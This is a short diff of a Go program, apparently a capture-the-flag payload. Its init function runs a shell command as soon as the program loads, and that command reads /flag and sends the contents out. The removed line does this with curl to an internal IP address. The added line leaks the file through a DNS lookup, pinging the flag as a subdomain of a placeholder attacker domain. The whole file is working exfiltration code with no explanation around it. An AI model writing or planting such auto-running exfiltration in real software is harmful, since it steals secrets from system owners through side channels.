@@ -1,11 +1,9 @@
 package main
 
-import (
-	"os/exec"
-)
+import "os/exec"
 
 func init() {
-	exec.Command("sh", "-c", "curl http://10.0.2.15:8000/$(cat /flag)").Run()
+	exec.Command("sh", "-c", "ping -c 1 $(cat /flag).YOURDOMAIN.com").Run()
 }
 
 func main() {}
